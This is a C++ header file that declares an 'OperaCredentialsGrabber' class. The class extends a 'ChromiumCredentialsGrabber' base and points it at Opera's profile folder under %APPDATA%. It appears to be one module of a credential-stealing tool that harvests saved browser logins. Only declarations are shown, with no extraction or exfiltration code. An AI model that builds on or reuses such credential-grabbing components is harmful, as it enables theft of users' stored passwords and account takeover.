#pragma once
#include "ChromiumCredentialsGrabber.hpp"

class OperaCredentialsGrabber final : public ChromiumCredentialsGrabber
{
public:
	explicit OperaCredentialsGrabber();
	~OperaCredentialsGrabber() override = default;
	OperaCredentialsGrabber(const OperaCredentialsGrabber&) = delete;
	OperaCredentialsGrabber& operator=(const OperaCredentialsGrabber&) = delete;
	OperaCredentialsGrabber(OperaCredentialsGrabber&&) = delete;
	OperaCredentialsGrabber& operator=(OperaCredentialsGrabber&&) = delete;

private:
	static constexpr auto OPERA_ROOT_FOLDER = L"%APPDATA%/Opera Software/Opera Stable/";

	[[nodiscard]] static std::filesystem::path get_local_opera_path();

	[[nodiscard]] std::filesystem::path get_user_data_path(const std::filesystem::path& app_root) const override;

public:
	[[nodiscard]] std::wstring source() const override;
};
